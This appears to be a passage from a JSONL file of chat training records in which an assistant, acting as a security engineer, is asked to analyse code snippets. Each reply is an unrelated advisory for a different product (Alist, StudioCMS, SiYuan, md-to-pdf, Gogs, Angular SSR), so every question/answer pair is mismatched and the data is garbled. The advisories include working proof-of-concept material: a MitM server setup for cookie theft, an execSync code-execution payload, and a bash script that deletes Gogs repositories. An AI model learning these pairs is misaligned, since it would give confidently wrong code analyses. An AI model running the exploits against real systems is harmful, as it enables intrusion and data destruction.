SVG attribute injection issue that can lead to cross-site scripting (XSS) when rendering attacker-controlled Mermaid diagrams. User-controlled values from Mermaid style and classDef directives are interpolated into SVG attribute values without proper escaping, allowing crafted input to break out of an attribute context and inject arbitrary SVG elements/attributes into the rendered output. When the generated SVG is embedded in a web page, this can result in script execution in the context of the embedding origin."}]}
{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "Analyze the following code for security vulnerabilities:\n\n```\nsk_deep_copy(void *sk_void, void *copy_func_void, void *free_func_void)\n{\n\t_STACK *sk = sk_void;\n\tvoid *(*copy_func)(void *) = copy_func_void;\n\tvoid (*free_func)(void *) = free_func_void;\n\t_STACK *ret = sk_dup(sk);\n\tsize_t i;\n\n\tif (ret == NULL)\n\t\treturn NULL;\n\n\tfor (i = 0; i < ret->num; i++) {\n\t\tif (ret->data[i] == NULL)\n\t\t\tcontinue;\n\t\tret->data[i] = copy_func(ret->data[i]);\n\t\tif (ret->data[i] == NULL) {\n\t\t\tsize_t j;\n\t\t\tfor (j = 0; j < i; j++) {\n\t\t\t\tif (ret->data[j] != NULL)\n\t\t\t\t\tfree_func(ret->data[j]);\n\t\t\t}\n\t\t\tsk_free(ret);\n\t\t\treturn NULL;\n\t\t}\n\t}\n\n\treturn ret;\n}\n\n```"}, {"role": "assistant", "content": "Alist has Insecure TLS Config\n\n### Summary\nThe application disables TLS certificate verification by default for all outgoing storage driver communications, making the system vulnerable to Man-in-the-Middle (MitM) attacks. This enables the complete decryption, theft, and manipulation of all data transmitted during storage operations, severely compromising the confidentiality and integrity of user data.\n\n### Details\nCertificate verification is disabled by default for all storage driver communications.\n\nThe `TlsInsecureSkipVerify` setting is default to true in the `DefaultConfig()` function in [internal/conf/config.go](https://github.com/AlistGo/alist/blob/b4d9beb49cba399842a54fcc33bc95a4a09b7bd4/internal/conf/config.go#L159).\n\n~~~go\nfunc DefaultConfig() *Config {\n    // ...\n    TlsInsecureSkipVerify: true,\n    // ...\n}\n~~~\n\nThis vulnerability enables Man-in-the-Middle (MitM) attacks by disabling TLS certificate verification, allowing attackers to intercept and manipulate all storage communications. Attackers can exploit this through network-level attacks like ARP spoofing, rogue Wi-Fi access points, or compromised internal network equipment to redirect traffic to malicious endpoints. Since certificate validation is skipped, the system will unknowingly establish encrypted connections with attacker-controlled servers, enabling full decryption, data theft, and manipulation of all storage operations without triggering any security warnings. \n\n\n\n#### PoC\nThe /etc/hosts file was modified to simulate DNS hijacking and redirect www.weiyun.com to a malicious TLS-enabled HTTP server.\n\nThe purpose of this Proof of Concept is to demonstrate that the Alist server will establish communication with a malicious server due to disabled certificate verification. This allows interception and theft of authentication cookies used for communicating with other storage providers.\n\n[Video](https://github.com/user-attachments/assets/5b042db0-d830-41d9-9cec-d2ba677ac53d)\n\n\n\n##### Setup a malicious https server:\n\nssl.conf:\n~~~\nLoadModule ssl_module modules/mod_ssl.so\nLoadModule log_config_module modules/mod_log_config.so\n\nListen 443\n\nLogFormat \"%h %l %u %t \\\"%r\\\" %>s %b Host:%{Host}i User-Agent:%{User-Agent}i Referer:%{Referer}i Accept:%{Accept}i Cookie:%{Cookie}i\" headers\nCustomLog \"/usr/local/apache2/logs/headers.log\" headers\n\n<VirtualHost _default_:443>\n    DocumentRoot \"/usr/local/apache2/htdocs\"\n    ServerName localhost\n\n    SSLEngine on\n    SSLCertificateFile \"/usr/local/apache2/conf/server.crt\"\n    SSLCertificateKeyFile \"/usr/local/apache2/conf/server.key\"\n\n    ErrorLog \"/usr/local/apache2/logs/ssl_error.log\"\n\n    <Directory \"/usr/local/apache2/htdocs\">\n        Options Indexes FollowSymLinks\n        AllowOverride None\n        Require all granted\n    </Directory>\n</VirtualHost>\n~~~\n\nDockerfile:\n~~~\nFROM httpd:2.4\n\n# Copy SSL config\nCOPY ssl.conf /usr/local/apache2/conf/extra/ssl.conf\n\n# Include SSL config in main httpd.conf\nRUN echo \"Include conf/extra/ssl.conf\" >> /usr/local/apache2/conf/httpd.conf\n\n# Copy certs\nCOPY certs/server.crt /usr/local/apache2/conf/server.crt\nCOPY certs/server.key /usr/local/apache2/conf/server.key\n~~~\n\nScripts to run https server:\n\n~~~bash\nmkdir certs\nopenssl req -x509 -nodes -days 365 \\\n  -newkey rsa:2048 \\\n  -keyout certs/server.key \\\n  -out certs/server.crt\ndocker build -t httpd-ssl .\ndocker run -dit --name my-https-server httpd-ssl\n~~~\n\n##### Run alist\n~~~bash\ndocker run -d --restart=unless-stopped -v /etc/alist:/opt/alist/data -p 5244:5244 -e PUID=0 -e PGID=0 -e UMASK=022 --name=\"alist\" alist666/alist:latest\n~~~\n\nSimulate DNS hijacking: Modify container's /etc/hosts to redirect www.weiyun.com to malicious server\n~~~\n<IP of HTTPS Server>      www.weiyun.com\n~~~\n\nIn the front end, add a weiyun storage and inspect log on tls server:\n~~~\nroot@f6d0f5bebe60:/usr/local/apache2# cat /usr/local/apache2/logs/headers.log\n172.17.0.3 - - [30/Oct/2025:03:52:58 +0000] \"GET /disk HTTP/1.1\" 404 196 Host:www.weiyun.com User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36 Referer:- Accept:- Cookie:WhatEverSecret=\n~~~\n\nNote that the cookie is in the log.\n\n### Impact\nThis misconfiguration allows attackers to perform man in the middle attack, which potentially leads to the complete decryption, theft, and manipulation of all data transmitted during storage operations, severely compromising the confidentiality and integrity of user data.\n\nThis vulnerability affects all alist deployment.\n\n### Credit\nThis vulnerability was discovered by:\n- XlabAI Team of Tencent Xuanwu Lab\n- Atuin Automated Vulnerability Discovery Engine\n\nIf there are any questions regarding the vulnerability details, please feel free to reach out for further discussion at xlabai@tencent.com."}]}
{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "Analyze the following code for security vulnerabilities:\n\n```\nsk_sp<SkTypeface> CreateSkTypeface(bool italic,\n                                   gfx::Font::Weight weight,\n                                   std::string* family,\n                                   bool* out_success) {\n  DCHECK(family);\n  TRACE_EVENT0(\"fonts\", \"gfx::CreateSkTypeface\");\n\n  const int font_weight = (weight == Font::Weight::INVALID)\n                              ? static_cast<int>(Font::Weight::NORMAL)\n                              : static_cast<int>(weight);\n  SkFontStyle sk_style(\n      font_weight, SkFontStyle::kNormal_Width,\n      italic ? SkFontStyle::kItalic_Slant : SkFontStyle::kUpright_Slant);\n  sk_sp<SkTypeface> typeface;\n  {\n    TRACE_EVENT1(TRACE_DISABLED_BY_DEFAULT(\"fonts\"), \"SkTypeface::MakeFromName\",\n                 \"family\", *family);\n    typeface = SkTypeface::MakeFromName(family->c_str(), sk_style);\n  }\n  if (!typeface) {\n    TRACE_EVENT1(TRACE_DISABLED_BY_DEFAULT(\"fonts\"), \"SkTypeface::MakeFromName\",\n                 \"family\", kFallbackFontFamilyName);\n    typeface = sk_sp<SkTypeface>(\n        SkTypeface::MakeFromName(kFallbackFontFamilyName, sk_style));\n    if (!typeface) {\n      *out_success = false;\n      return nullptr;\n    }\n    *family = kFallbackFontFamilyName;\n  }\n  *out_success = true;\n  return typeface;\n}\n\n```"}, {"role": "assistant", "content": "StudioCMS has Authorization Bypass Through User-Controlled Key\n\n### Summary\nStudioCMS contains a Broken Object Level Authorization (BOLA) vulnerability in the Content Management feature that allows users with the \"Visitor\" role to access draft content created by Editor/Admin/Owner users.\n\n### Details\n**The Issue:**\nThe endpoint `/dashboard/content-management/edit?edit={UUID}` validates user authentication but does NOT validate:\n1. User role (should require Editor/Admin/Owner)\n2. Content ownership (should verify the draft belongs to the user)\n\nThis allows users with \"Visitor\" role (lowest privilege) to access draft content created by Editor/Admin/Owner users by directly accessing the edit URL with the content UUID.\n\n### PoC\n   - **User A:** Editor role (example username: `dummy04`)\n   - **User B:** Visitor role (example username: `dummy01`)\n\n**Reproduction Steps:**\n\n**Step 1 - Create draft as Editor:**\n\n1. Login as User A (Editor role)\n2. Navigate to: `http://localhost:4321/dashboard/content-management`\n3. Create new content (it will stay as draft)\n4. After saving, note the UUID in the URL:\n````\n   http://localhost:4321/dashboard/content-management/edit?edit=bad87630-69a4-4cd6-bcb2-6965839dc148\n````\n   Copy this UUID: `bad87630-69a4-4cd6-bcb2-6965839dc148`\n\n**Step 2 - Access draft as Visitor:**\n\n1. Login as Visitor and get auth_session cookie\n```\ncurl -X POST \"http://127.0.0.1:4321/studiocms_api/auth/login\" -F 'username=dummy01' -F 'password=dummy01pass$'\n```\n<img width=\"1128\" height=\"376\" alt=\"01\" src=\"https://github.com/user-attachments/assets/86c5290e-e7a2-470e-bbf5-5f5247eddec1\" />\n\n2. Proof of Visitor permission\n<img width=\"1899\" height=\"450\" alt=\"02\" src=\"https://github.com/user-attachments/assets/aabd47d3-163f-4a56-8296-08bd40c5ccdc\" />\n\n3. Access Editor's draft using the UUID\n```\ncurl \"http://127.0.0.1:4321/dashboard/content-management/edit?edit=bad87630-69a4-4cd6-bcb2-6965839dc148\" -H \"Cookie: auth_session=qvawh6zv23hc2spu6xx7pzgrnn4rpd3q\" -v\n```\n\n**Result:** Returns full HTML page with draft content (200 OK)\n\n### Impact\n**Impact Scenarios:**\n\n1. **Information Disclosure:**\n   - Visitor users can read unpublished drafts containing sensitive information\n   - Drafts may contain confidential business information, unreleased announcements, or proprietary content\n   - Competitive intelligence could be gathered from draft content\n\n2. **Privacy Violation:**\n   - Personal notes, work-in-progress content, or internal communications in drafts exposed\n   - Violation of content creator privacy expectations\n\n3. **Business Impact:**\n   - Premature disclosure of marketing campaigns, product launches, or announcements\n   - Loss of competitive advantage if draft strategies are exposed\n   - Potential compliance issues if drafts contain regulated information\n\n4. **Complete RBAC Bypass:**\n   - The entire role-based access control system for draft content is bypassed\n   - \"Visitor\" role becomes equivalent to \"Editor\" for read access to drafts\n   - Undermines the trust model of multi-user content management"}]}
{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "Analyze the following code for security vulnerabilities:\n\n```\nuser_change_location_authorized_cb (Daemon                *daemon,\n                                    User                  *user,\n                                    GDBusMethodInvocation *context,\n                                    gpointer               data)\n\n{\n        gchar *location = data;\n\n        if (g_strcmp0 (accounts_user_get_location (ACCOUNTS_USER (user)), location) != 0) {\n                accounts_user_set_location (ACCOUNTS_USER (user), location);\n\n                save_extra_data (user);\n        }\n\n        accounts_user_complete_set_location (ACCOUNTS_USER (user), context);\n}\n\n```"}, {"role": "assistant", "content": "SiYuan Vulnerable to Arbitrary File Read via File Copy Functionality\n\n### Summary\nThe SiYuan Note application (v3.5.3) contains a logic vulnerability in the /api/file/globalCopyFiles endpoint. The function allows authenticated users to copy files from any location on the server's filesystem into the application's workspace without proper path validation\n### Details\nThe vulnerability exists in the api/file.go source code. The function globalCopyFiles accepts a list of source paths (srcs) from the JSON request body. While the code checks if the source file exists using filelock.IsExist(src), it fails to validate whether the source path resides within the authorized workspace directory.\n\n\n```\nfunc globalCopyFiles(c *gin.Context) {\n    // ...\n\n    srcsArg := arg[\"srcs\"].([]interface{})\n    \n    for _, src := range srcs {\n\n        if !filelock.IsExist(src) { ... }\n        \n\n        if err := filelock.Copy(src, dest); err != nil { ... }\n    }\n}\n```\n\n### PoC\nThe following steps demonstrate how to exfiltrate the /etc/passwd file.\n\n1. The attacker sends a request to copy the system file /etc/passwd to the root of the application workspace (/).\n\n<img width=\"1537\" height=\"357\" alt=\"image\" src=\"https://github.com/user-attachments/assets/7c8e5fe8-f609-4263-8685-eedf3cf22400\" />\n\n2. The attacker downloads the copied file using the standard file retrieval API, which now treats the system file as a legitimate workspace asset.\n\n<img width=\"1549\" height=\"588\" alt=\"image\" src=\"https://github.com/user-attachments/assets/37cac3dd-d9a9-4191-92ea-16f0424c73e1\" />\n<img width=\"756\" height=\"337\" alt=\"image\" src=\"https://github.com/user-attachments/assets/c872d729-259b-4b2a-9314-8be6b2b9b26a\" />\n\n\n### Impact\nThis vulnerability allows an attacker to read arbitrary files from the server's filesystem, bypassing intended directory restrictions. By exfiltrating sensitive configuration files (such as docker-compose.yml containing database credentials) and system files (like /etc/passwd), an attacker can harvest secrets to pivot from application access to full infrastructure compromise. This results in a complete loss of confidentiality regarding both user data and the underlying server environment.\n\n### Tested version:\n<img width=\"1118\" height=\"650\" alt=\"image\" src=\"https://github.com/user-attachments/assets/c98cbbcc-2a28-4a15-b84e-4a7120649c5e\" />\n\n### Solution\n\nhttps://github.com/siyuan-note/siyuan/issues/16860"}]}
{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "Analyze the following code for security vulnerabilities:\n\n```\nstatic void timeEndFunction(const v8::FunctionCallbackInfo<v8::Value>& info, bool timelinePrefix)\n{\n    ConsoleHelper helper(info);\n    if (V8InspectorClient* client = helper.ensureDebuggerClient()) {\n        String16 protocolTitle = helper.firstArgToString(\"default\");\n        if (timelinePrefix)\n            protocolTitle = \"Timeline '\" + protocolTitle + \"'\";\n        client->consoleTimeEnd(protocolTitle);\n\n        v8::Local<v8::Map> timeMap;\n        if (!helper.privateMap(\"V8Console#timeMap\").ToLocal(&timeMap))\n            return;\n        double elapsed = client->currentTimeMS() - helper.getDoubleFromMap(timeMap, protocolTitle, 0.0);\n        String16 message = protocolTitle + \": \" + String16::fromDoublePrecision3(elapsed) + \"ms\";\n        helper.reportCallWithArgument(ConsoleAPIType::kTimeEnd, message);\n    }\n}\n\n```"}, {"role": "assistant", "content": "Cloudflare Agents is Vulnerable to Reflected Cross-Site Scripting in the AI Playground's OAuth callback handler\n\nSummary\n\nA Reflected Cross-Site Scripting (XSS) vulnerability was discovered in the AI Playground's OAuth callback handler. The `error_description` query parameter was directly interpolated into an HTML script tag without proper escaping, allowing attackers to execute arbitrary JavaScript in the context of the victim's session.\n\nRoot cause\n\nThe OAuth callback handler in `site/ai-playground/src/server.ts` directly interpolated the `authError` value, sourced from the `error_description` query parameter,  into an inline `<script>` tag.\n\nImpact\n\nAn attacker could craft a malicious link that, when clicked by a victim, would:\n\n  *  Steal user chat message history - Access all LLM interactions stored in the user's session.\n\n\n  *  Access connected MCP Servers - Interact with any MCP servers connected to the victim's session (public or authenticated/private), potentially allowing the attacker to perform actions on the victim's behalf\n\n\nMitigation:\n\n  *  PR:  https://github.com/cloudflare/agents/pull/841 https://github.com/cloudflare/agents/pull/841 \n  *  Agents-sdk users should upgrade to agents@0.3.10\n  *  Developers using configureOAuthCallback with custom error handling in their own applications should ensure all user-controlled input is escaped before interpolation."}]}
{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "Analyze the following code for security vulnerabilities:\n\n```\nstatic void ssi_sd_class_init(ObjectClass *klass, void *data)\n{\n    SSISlaveClass *k = SSI_SLAVE_CLASS(klass);\n\n    k->init = ssi_sd_init;\n    k->transfer = ssi_sd_transfer;\n    k->cs_polarity = SSI_CS_LOW;\n}\n\n```"}, {"role": "assistant", "content": "md-to-pdf vulnerable to arbitrary JavaScript code execution when parsing front matter\n\n### Summary\nA Markdown front-matter block that contains JavaScript delimiter causes the JS engine in gray-matter library to execute arbitrary code in the Markdown to PDF converter process of **md-to-pdf** library, resulting in remote code execution.\n\n### Details\n**md-to-pdf** uses the gray-matter library to parse front-matter. Gray-matter exposes a JavaScript engine that, when enabled or triggered by certain front-matter delimiters (e.g. ---js or ---javascript), will evaluate the front-matter contents as JavaScript. If user-supplied Markdown is fed to md-to-pdf and the front-matter contains malicious JS, the converter process will execute that code.\n\n\n### PoC\n```\nconst { mdToPdf } = require('md-to-pdf');\n\nvar payload = '---javascript\\n((require(\"child_process\")).execSync(\"calc.exe\"))\\n---RCE';\n\n(async () => {\n\tawait mdToPdf({ content: payload }, { dest: './output.pdf'});\n})();\n```\nRunning the PoC on Windows launches the calculator application, demonstrating arbitrary code execution.\n\n### Impact\n\n- Remote code execution in the process that performs Markdown->PDF conversion.\n- If the converter is run in a web app or cloud service, an attacker uploading malicious Markdown can execute arbitrary commands on the"}]}
{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "Analyze the following code for security vulnerabilities:\n\n```\nstatic u8 mtrr_disabled_type(struct kvm_vcpu *vcpu)\n{\n\t/*\n\t * Intel SDM 11.11.2.2: all MTRRs are disabled when\n\t * IA32_MTRR_DEF_TYPE.E bit is cleared, and the UC\n\t * memory type is applied to all of physical memory.\n\t *\n\t * However, virtual machines can be run with CPUID such that\n\t * there are no MTRRs.  In that case, the firmware will never\n\t * enable MTRRs and it is obviously undesirable to run the\n\t * guest entirely with UC memory and we use WB.\n\t */\n\tif (guest_cpuid_has_mtrr(vcpu))\n\t\treturn MTRR_TYPE_UNCACHABLE;\n\telse\n\t\treturn MTRR_TYPE_WRBACK;\n}\n\n```"}, {"role": "assistant", "content": "Gogs has authorization bypass in repository deletion API\n\n### Summary\n\nThe DELETE /api/v1/repos/:owner/:repo endpoint lacks necessary permission validation middleware. Consequently, any user with read access (including read-only collaborators) can delete the entire repository.\n\nThis vulnerability stems from the API route configuration only utilizing the repoAssignment() middleware (which only verifies read access) without enforcing reqRepoOwner() or reqRepoAdmin().\n\n### Details\n0. vulnerability location:\n\n- Vulnerable Endpoint：DELETE /api/v1/repos/:owner/:repo\n- Routing configuration file: internal/route/api/v1/api.go (approximately line 253)\n- Function handling file: internal/route/api/v1/repo/repo.go (approximately lines 320-338)\n\n1. Root Cause Analysis\n\nCode Location 1: API Route Configuration (internal/route/api/v1/api.go ~ line 253)\n\n```go\n// 当前的路由配置（存在漏洞）\nm.Delete(\"\", repo.Delete)  // 仅继承了外层的 repoAssignment() 中间件\n```\n\nCode Location 2: Delete Function Implementation (internal/route/api/v1/repo/repo.go ~ lines 320-338)\n```go\n// Delete 函数内部没有额外的权限检查\nfunc Delete(c *context.APIContext) {\n    // 直接执行删除操作，未验证用户是否为所有者\n    if err := models.DeleteRepository(c.User.ID, c.Repo.Repository.ID); err != nil {\n        c.Error(500, \"DeleteRepository\", err)\n        return\n    }\n    c.Status(204)\n}\n```\n\n2. Missing Permission Check\nComparison with route configurations for other sensitive operations:\n\n```go\n// Webhooks 管理（正确实现）\nm.Group(\"/hooks\", func() {\n    m.Combo(\"\").\n        Get(repo.ListHooks).\n        Post(bind(api.CreateHookOption{}), repo.CreateHook)\n}, reqRepoAdmin())  // ✅ 使用了权限中间件\n\n// 部署密钥管理（正确实现）\nm.Group(\"/keys\", func() {\n    m.Combo(\"\").\n        Get(repo.ListDeployKeys).\n        Post(bind(api.CreateKeyOption{}), repo.CreateDeployKey)\n}, reqRepoAdmin())  // ✅ 使用了权限中间件\n\n// 删除仓库（漏洞）\nm.Delete(\"\", repo.Delete)  // ❌ 没有使用权限中间件\n```\n3. Data Flow Path\n\n- API Request Path: DELETE /api/v1/repos/:owner/:repo\n- Route Handling: The outer middleware repoAssignment() verifies that the user has read access (Passed).\n- Execution: The system directly executes the repo.Delete() function.\n- Permission Check: The reqRepoOwner() middleware check is missing.\n- Internal Validation: There is no permission validation inside the Delete() function either.\n- Result: Any user with read permission can delete the repository.\n\n\n### PoC\n\nPrerequisites\n\n- A running Gogs instance.\n- The attacker's account is added as a collaborator to the target repository (Read access is sufficient).\n- The attacker possesses a valid API access token.\n- The target repository exists and is accessible.\n\n📜 Test Steps (Bash)\n\n1. Verify Gogs service is running\ncurl -I http://localhost:10880\n\n2. Create test accounts and repository\n- Owner account: owner / owner123456\n- Read-only account: victim / victim123456\n- Test repository: owner/delete-test\n<img width=\"1580\" height=\"832\" alt=\"image\" src=\"https://github.com/user-attachments/assets/d1babac8-d952-4765-ba34-d4891c12b8db\" />\n\n\n3. Add 'victim' as a read-only collaborator\nPerform this via the Web UI or API\n<img width=\"1597\" height=\"725\" alt=\"image\" src=\"https://github.com/user-attachments/assets/f76db1d4-9e45-4a97-af22-50db124ec4d0\" />\n<img width=\"1597\" height=\"760\" alt=\"image\" src=\"https://github.com/user-attachments/assets/f6ef3bd9-47d4-4202-bf10-2022be557f16\" />\n\n\n\n4. Obtain API token for 'victim'\ncurl -X POST http://localhost:10880/api/v1/users/victim/tokens \\\n  -u victim:victim123456 \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"name\":\"test-token\"}'\n\n5. Resource deleted\n<img width=\"1602\" height=\"483\" alt=\"image\" src=\"https://github.com/user-attachments/assets/3e77aaaa-ffbc-4521-be4b-9a62f36499ff\" />\nWeb UI：Target repository deletion successful\n<img width=\"1581\" height=\"853\" alt=\"image\" src=\"https://github.com/user-attachments/assets/fbd6b4a4-c874-44f9-9b6e-765371eddcc7\" />\n\n\n📜 PoC Script\n\n```bash\n#!/bin/bash\n# Gogs 仓库删除授权绕过漏洞 PoC\n\n# ============ 配置信息 ============\nGOGS_URL=\"http://localhost:10880\"\nTARGET_REPO=\"owner/delete-test\"\nVICTIM_TOKEN=\"your_victim_read_only_token_here\"\n\n# ============ 执行攻击 ============\necho \"========================================\"\necho \"Gogs 仓库删除授权绕过漏洞 PoC\"\necho \"========================================\"\necho \"\"\necho \"目标仓库: $TARGET_REPO\"\necho \"攻击者权限: Read（只读）\"\necho \"预期行为: 403 Forbidden（应该被拒绝）\"\necho \"\"\n\n# 步骤1：验证仓库存在\necho \"[步骤1] 验证目标仓库存在...\"\nREPO_CHECK=$(curl -s -o /dev/null -w \"%{http_code}\" \\\n  -H \"Authorization: token $VICTIM_TOKEN\" \\\n  \"$GOGS_URL/api/v1/repos/$TARGET_REPO\")\n\nif [ \"$REPO_CHECK\" == \"200\" ]; then\n    echo \"✓ 仓库存在且可访问\"\nelse\n    echo \"✗ 仓库不存在或无权访问 (状态码: $REPO_CHECK)\"\n    exit 1\nfi\n\n# 步骤2：尝试删除仓库（漏洞利用）\necho \"\"\necho \"[步骤2] 使用只读权限尝试删除仓库...\"\nDELETE_RESPONSE=$(curl -s -w \"\\nHTTP_CODE:%{http_code}\" \\\n  -X DELETE \\\n  -H \"Authorization: token $VICTIM_TOKEN\" \\\n  \"$GOGS_URL/api/v1/repos/$TARGET_REPO\")\n\nDELETE_CODE=$(echo \"$DELETE_RESPONSE\" | grep \"HTTP_CODE:\" | cut -d: -f2)\n\necho \"实际状态码: $DELETE_CODE\"\necho \"\"\n\n# 步骤3：验证结果\nif [ \"$DELETE_CODE\" == \"204\" ] || [ \"$DELETE_CODE\" == \"200\" ]; then\n    echo \"========================================\"\n    echo \"🔴 漏洞确认：删除成功！\"\n    echo \"========================================\"\n    echo \"\"\n    echo \"只读权限用户成功删除了仓库！\"\n    echo \"\"\n    \n    # 验证仓库是否真的被删除\n    sleep 2\n    echo \"验证仓库是否真的被删除...\"\n    VERIFY_CHECK=$(curl -s -o /dev/null -w \"%{http_code}\" \\\n      -H \"Authorization: token $VICTIM_TOKEN\" \\\n      \"$GOGS_URL/api/v1/repos/$TARGET_REPO\")\n    \n    if [ \"$VERIFY_CHECK\" == \"404\" ]; then\n        echo \"✗ 仓库已被完全删除（404 Not Found）\"\n        echo \"\"\n        echo \"危害确认：\"\n        echo \"  - 仓库及所有数据永久丢失\"\n        echo \"  - 代码历史记录不可恢复\"\n        echo \"  - 这是一个 HIGH 级别的严重漏洞\"\n    else\n        echo \"? 仓库状态未知 (状态码: $VERIFY_CHECK)\"\n    fi\n    \nelif [ \"$DELETE_CODE\" == \"403\" ]; then\n    echo \"========================================\"\n    echo \"✅ 无漏洞：操作被正确拒绝\"\n    echo \"========================================\"\n    echo \"\"\n    echo \"只读权限用户无法删除仓库，权限检查正常\"\n    \nelse\n    echo \"========================================\"\n    echo \"⚠️  未预期的响应\"\n    echo \"========================================\"\n    echo \"\"\n    echo \"状态码: $DELETE_CODE\"\n    echo \"这可能表示 API 端点不存在或其他错误\"\nfi\n\necho \"\"\necho \"========================================\"\necho \"PoC 执行完成\"\necho \"========================================\"\n```\n\n\n### Impact\nVulnerability Type: Broken Access Control (CWE-284)\n\nDescription: A critical authorization bypass vulnerability exists in the Gogs API. The access control mechanism fails to properly validate permissions for destructive operations.\n\nConsequences: An authenticated attacker with low-level privileges (e.g., a collaborator with Read-Only access) can exploit this vulnerability to issue unauthorized DELETE requests. This allows the attacker to permanently delete entire repositories, resulting in the immediate loss of all source code, git history, issues, and wiki documentation.\n\nSeverity: This vulnerability poses a critical risk to data integrity and availability, potentially leading to irreversible data loss and significant operational disruption for affected organizations.\n\nThe Core Risk: Privilege Escalation & Data Destruction The most critical aspect of this vulnerability is the violation of the Principle of Least Privilege. It allows a user with the lowest level of access (Read-Only) to execute the most destructive action possible (Delete)."}]}
{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "Analyze the following code for security vulnerabilities:\n\n```\ndaemon_seraddr(struct sockaddr_storage *sockaddrin, struct rpcap_sockaddr *sockaddrout)\n{\n\tmemset(sockaddrout, 0, sizeof(struct sockaddr_storage));\n\n\tif (sockaddrin == NULL) return;\n\n\tswitch (sockaddrin->ss_family)\n\t{\n\tcase AF_INET:\n\t\t{\n\t\tstruct sockaddr_in *sockaddrin_ipv4;\n\t\tstruct rpcap_sockaddr_in *sockaddrout_ipv4;\n\n\t\tsockaddrin_ipv4 = (struct sockaddr_in *) sockaddrin;\n\t\tsockaddrout_ipv4 = (struct rpcap_sockaddr_in *) sockaddrout;\n\t\tsockaddrout_ipv4->family = htons(RPCAP_AF_INET);\n\t\tsockaddrout_ipv4->port = htons(sockaddrin_ipv4->sin_port);\n\t\tmemcpy(&sockaddrout_ipv4->addr, &sockaddrin_ipv4->sin_addr, sizeof(sockaddrout_ipv4->addr));\n\t\tmemset(sockaddrout_ipv4->zero, 0, sizeof(sockaddrout_ipv4->zero));\n\t\tbreak;\n\t\t}\n\n#ifdef AF_INET6\n\tcase AF_INET6:\n\t\t{\n\t\tstruct sockaddr_in6 *sockaddrin_ipv6;\n\t\tstruct rpcap_sockaddr_in6 *sockaddrout_ipv6;\n\n\t\tsockaddrin_ipv6 = (struct sockaddr_in6 *) sockaddrin;\n\t\tsockaddrout_ipv6 = (struct rpcap_sockaddr_in6 *) sockaddrout;\n\t\tsockaddrout_ipv6->family = htons(RPCAP_AF_INET6);\n\t\tsockaddrout_ipv6->port = htons(sockaddrin_ipv6->sin6_port);\n\t\tsockaddrout_ipv6->flowinfo = htonl(sockaddrin_ipv6->sin6_flowinfo);\n\t\tmemcpy(&sockaddrout_ipv6->addr, &sockaddrin_ipv6->sin6_addr, sizeof(sockaddrout_ipv6->addr));\n\t\tsockaddrout_ipv6->scope_id = htonl(sockaddrin_ipv6->sin6_scope_id);\n\t\tbreak;\n\t\t}\n#endif\n\t}\n}\n\n```"}, {"role": "assistant", "content": "Angular SSR has a Server-Side Request Forgery (SSRF) flaw\n\n### Impact\nThe vulnerability is a **Server-Side Request Forgery (SSRF)** flaw within the URL resolution mechanism of Angular's Server-Side Rendering package (`@angular/ssr`).\n\nThe function `createRequestUrl` uses the native `URL` constructor. When an incoming request path (e.g., `originalUrl` or `url`) begins with a **double forward slash (`//`) or backslash (`\\\\`)**, the `URL` constructor treats it as a **schema-relative URL**. This behavior overrides the security-intended base URL (protocol, host, and port) supplied as the second argument, instead resolving the URL against the scheme of the base URL but adopting the attacker-controlled hostname.\n\nThis allows an attacker to specify an external domain in the URL path, tricking the Angular SSR environment into setting the page's virtual location (accessible via `DOCUMENT` or `PlatformLocation` tokens) to this attacker-controlled domain. Any subsequent **relative HTTP requests** made during the SSR process (e.g., using `HttpClient.get('assets/data.json')`) will be incorrectly resolved against the attacker's domain, forcing the server to communicate with an arbitrary external endpoint.\n\n#### Exploit Scenario\nA request to `http://localhost:4200//attacker-domain.com/some-page` causes Angular to believe the host is attacker-domain.com. A relative request to api/data then becomes a server-side request to `http://attacker-domain.com/api/data`.\n\n### Patches\n\n- `@angular/ssr` 19.2.18\n- `@angular/ssr` 20.3.6\n- `@angular/ssr` 21.0.0-next.8\n\n## Mitigation\n\nThe application's internal location must be robustly determined from the incoming request. The fix requires sanitizing or validating the request path to prevent it from being interpreted as a schema-relative URL (i.e., ensuring it does not start with `//`).\n\n#### Server-Side Middleware\nIf you can't upgrade to a patched version, implement a **middleware** on the Node.js/Express server that hosts the Angular SSR application to explicitly reject or sanitize requests where the path begins with a double slash (`//`).\n\n**Example (Express/Node.js):**\n\n```ts\n// Place this middleware before the Angular SSR handler\napp.use((req, res, next) => {\n  if (req.originalUrl?.startsWith('//')) {\n    // Sanitize by forcing a single slash\n    req.originalUrl = req.originalUrl.replace(/^\\/\\/+/, '/');\n    req.url = req.url.replace(/^\\/\\/+/, '/');\n  }\n  next();\n});\n```\n\n### References\n\n- Report: https://github.com/angular/angular-cli/issues/31464\n- Fix:  https://github.com/angular/angular-cli/pull/31474"}]}
